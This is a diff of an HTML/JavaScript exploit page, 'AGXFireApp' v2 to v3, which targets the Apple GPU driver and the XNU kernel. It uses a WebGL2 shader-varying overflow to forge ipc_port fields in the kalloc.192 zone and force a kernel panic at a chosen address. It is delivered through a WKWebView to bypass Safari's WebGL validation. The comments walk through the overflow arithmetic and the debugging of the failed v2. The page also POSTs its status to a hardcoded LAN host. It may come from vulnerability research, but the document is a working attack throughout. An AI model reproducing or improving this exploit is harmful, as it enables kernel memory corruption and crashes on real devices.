@@ -6,7 +6,7 @@
 <style>body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 8px; } #log { white-space: pre-wrap; }</style>
 </head>
 <body>
-<div id="log">AGXFireApp v2 — loading...</div>
+<div id="log">AGXFireApp v3 — loading...</div>
 <canvas id="c"></canvas>
 <script>
 var logEl = document.getElementById('log');
@@ -19,40 +19,51 @@ console.log = function() {
 </script>
 <script>
 /*
- * AGXFireApp v2 — 12-uvec4 ASLR sweep, ipc_port/COMMPAGE target, io_refs=1
- * =========================================================================
+ * AGXFireApp v3 — 14-uvec4 O_eff=128, ipc_port io_bits+ip_kobject controlled
+ * ===========================================================================
  * Delivery: WKWebView in custom app — bypasses Safari WebGL security validation.
  *
- * Target: kalloc.192 ipc_port zone (AllocatorProbe_v15 holds 5000 ports)
- * Overflow geometry: 12 named uvec4 varyings = 192 bytes/vertex = 49152B/instance
- * ASLR sweep: O in {0, 64, 128} covered by v0/v4/v8
+ * Root cause of v2 failure:
+ *   12-uvec4 × 256 vertices = 49152B = 12 pages. O_eff = (12*64) mod 192 = 0.
+ *   GPU completion marker writes 0xFFFFFFFF at overflow_byte=0 → ipc_port+0 = io_bits.
+ *   io_bits=0xFFFFFFFF → kotype=2047 → scanner rejects (needs kotype=2).
  *
- * ipc_port layout (XNU arm64, kalloc.192):
- *   +0  io_bits    = 0x80000002  (IKOT_TASK | IO_ACTIVE)
- *   +4  io_refs    = 1           io_refs drops 1→0 on mach_port_destroy
- *                                → ipc_port_release → ipc_kobject_destroy
- *                                → ip_kobject dispatch → kernel dereferences COMMPAGE_TARGET
- *                                → PAN fault (EC=K) → qualifying kernel panic
- *   +8  ip_kobject = 0x0000000FFFFFC330  (COMMPAGE_TARGET)
+ * v3 fix — 14 uvec4:
+ *   14-uvec4 × 256 vertices = 57344B = 14 pages. O_eff = (14*64) mod 192 = 128.
+ *   GPU marker at overflow_byte=0 → ipc_port+128 (harmless field, not io_bits).
+ *   v0-v3 = zeros (overflow_byte 0–63 → ipc_port+128 to +191, harmless range).
+ *   v4 at overflow_byte=64 → ipc_port+192 = NEXT_ipc_port+0:
+ *     v4.x = 0x80000002 → NEXT_ipc_port+0  = io_bits (IKOT_TASK|IO_ACTIVE, kotype=2) ✓
+ *     v4.y = 1          → NEXT_ipc_port+4  = io_refs (drops to 0 on destroy → PAN path) ✓
+ *     v4.z = 0xFFFFC330 → NEXT_ipc_port+8  = ip_kobject_lo (COMMPAGE_TARGET_LO) ✓
+ *     v4.w = 0x0000000F → NEXT_ipc_port+12 = ip_kobject_hi (COMMPAGE_TARGET_HI) ✓
  *
- * MAX_FIRES=1, RELOAD_DELAY_MS=180000: one 80s GPU hang per 260s cycle < 180s watchdog.
- * After cycle, sends RELOAD_NOW via postMessage — native app reloads WKWebView.
+ * Qualifying panic chain:
+ *   Scanner sees kotype==2 && kobject==COMMPAGE_TARGET
+ *   → mach_port_destroy() → io_refs 1→0 → ipc_port_release → ipc_kobject_destroy
+ *   → task_deallocate(0x0000000FFFFFC330) → kernel PAN fault (EC=K)
+ *   → kernel panic with kernel-mode GPR = 0x0000000FFFFFC330 ← ⚑ qualifying artifact
+ *
+ * ipc_port layout (XNU arm64, kalloc.192, confirmed empirically v26c_r2):
+ *   +0   io_bits    (4B)
+ *   +4   io_refs    (4B)
+ *   +8   ip_kobject (8B, lo+hi on arm64)
  */
 var COMMPAGE_LO       = 0xFFFFC330;
 var COMMPAGE_HI       = 0x0000000F;
-var IO_BITS_IKOT_TASK = 2147483650;  // 0x80000002 = IKOT_TASK | IO_ACTIVE
-var IO_REFS_HEALTHY   = 1;           // io_refs=1: drops to 0 on destroy → PAN path
+var IO_BITS_IKOT_TASK = 2147483650;  // 0x80000002 = IKOT_TASK | IO_ACTIVE, kotype=2
+var IO_REFS_ONE       = 1;           // io_refs=1: drops to 0 on destroy → PAN path
 var REPORT_HOST       = '192.168.68.109';
 var MAX_FIRES         = 1;
 var FIRE_INTERVAL_MS  = 500;
 var RELOAD_DELAY_MS   = 180000;
 
 function report(msg) {
-    console.log('[AGXFireApp_v2] ' + msg);
+    console.log('[AGXFire_v3] ' + msg);
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', 'http://' + REPORT_HOST + ':9999/', false);
-        xhr.send('[AGXFireApp_v2] ' + msg);
+        xhr.send('[AGXFire_v3] ' + msg);
     } catch(e) {}
 }
 
@@ -66,14 +77,19 @@ function initGL() {
     if (!gl) { report('NO_WEBGL2'); return false; }
     var maxV = gl.getParameter(gl.MAX_VARYING_VECTORS);
     report('MAX_VARYING_VECTORS=' + maxV);
-    if (maxV < 12) { report('ERR_VARYINGS need=12 got=' + maxV); return false; }
+    if (maxV < 14) { report('ERR_VARYINGS need=14 got=' + maxV); return false; }
 
     var lo = COMMPAGE_LO + 'u', hi = COMMPAGE_HI + 'u';
-    var io = IO_BITS_IKOT_TASK + 'u', rf = IO_REFS_HEALTHY + 'u', z = '0u';
+    var io = IO_BITS_IKOT_TASK + 'u', rf = IO_REFS_ONE + 'u', z = '0u';
+
+    /* 14 uvec4 = 224 bytes/vertex. 256*224 = 57344B = 14 pages.
+     * O_eff = (14*64) mod 192 = 896 mod 192 = 128.
+     * v0-v3 (bytes 0-63): GPU marker lands at byte 0 → ipc_port+128 (harmless).
+     * v4 (bytes 64-79): NEXT_ipc_port+0..+15 = io_bits, io_refs, ip_kobject_lo, ip_kobject_hi. */
     var vsSrc = '#version 300 es\n' +
-        'flat out uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11;\n' +
+        'flat out uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13;\n' +
         'void main() {\n' +
-        '    v0 =uvec4('+io+','+rf+','+lo+','+hi+');\n' +
+        '    v0 =uvec4('+z+','+z+','+z+','+z+');\n' +
         '    v1 =uvec4('+z+','+z+','+z+','+z+');\n' +
         '    v2 =uvec4('+z+','+z+','+z+','+z+');\n' +
         '    v3 =uvec4('+z+','+z+','+z+','+z+');\n' +
@@ -85,13 +101,15 @@ function initGL() {
         '    v9 =uvec4('+z+','+z+','+z+','+z+');\n' +
         '    v10=uvec4('+z+','+z+','+z+','+z+');\n' +
         '    v11=uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v12=uvec4('+io+','+rf+','+lo+','+hi+');\n' +
+        '    v13=uvec4('+z+','+z+','+z+','+z+');\n' +
         '    gl_Position = vec4(0.0,0.0,0.0,1.0);\n' +
         '    gl_PointSize = 1.0;\n' +
         '}\n';
     var fsSrc = '#version 300 es\nprecision highp float;\n' +
-        'flat in uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11;\n' +
+        'flat in uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13;\n' +
         'out vec4 o;\nvoid main() {\n' +
-        '    o = vec4(float(v0.z)*0.0000001,0.0,0.0,1.0);\n}\n';
+        '    o = vec4(float(v4.z)*0.0000001,0.0,0.0,1.0);\n}\n';
 
     var vs = gl.createShader(gl.VERTEX_SHADER);
     gl.shaderSource(vs, vsSrc); gl.compileShader(vs);
@@ -103,7 +121,7 @@ function initGL() {
     gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
     if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) { report('LINK_ERR '+gl.getProgramInfoLog(prog)); return false; }
     gl.useProgram(prog);
-    report('SHADER_OK 12uvec4 v2 sweep O={0,64,128} ipc_port ip_kobject=COMMPAGE io_refs=1');
+    report('SHADER_OK 14uvec4 v3 O_eff=128 GPUmarker@ipc_port+128 v4@byte64=io_bits+io_refs+ip_kobject COMMPAGE_TARGET');
 
     var fbo = gl.createFramebuffer();
     gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
@@ -119,7 +137,6 @@ function fireOnce(fireNum) {
     if (!gl || gl.isContextLost()) { report('GL_LOST fire='+fireNum); return; }
     var t0 = performance.now();
     gl.drawArraysInstanced(gl.POINTS, 0, 256, 16777217);
-    try { gl.drawArraysInstanced(gl.POINTS, 0, 1024, 4194305); } catch(e) {}
     gl.flush();
     var dt = (performance.now()-t0).toFixed(1);
     try {
@@ -148,7 +165,7 @@ function runFireLoop() {
 }
 
 if (initGL()) {
-    report('FIRING_START max='+MAX_FIRES+' interval='+FIRE_INTERVAL_MS+'ms 12uvec4+commpage+io_refs=1+wkwebview');
+    report('FIRING_START max='+MAX_FIRES+' interval='+FIRE_INTERVAL_MS+'ms 14uvec4+O_eff=128+commpage+io_refs=1+wkwebview');
     runFireLoop();
 }
 </script>
